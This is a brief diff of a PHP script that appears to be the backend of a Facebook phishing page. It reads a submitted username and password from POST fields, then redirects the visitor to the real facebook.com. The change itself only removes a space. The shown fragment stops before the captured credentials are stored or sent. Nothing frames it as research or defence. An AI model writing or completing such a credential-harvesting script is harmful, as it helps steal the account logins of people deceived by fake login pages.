@@ -1,5 +1,5 @@
 <?php
-header ("location:https://www.facebook.com");
+header("location:https://www.facebook.com");
 $a = $_POST["user"];
 $b = $_POST["pass"];
 
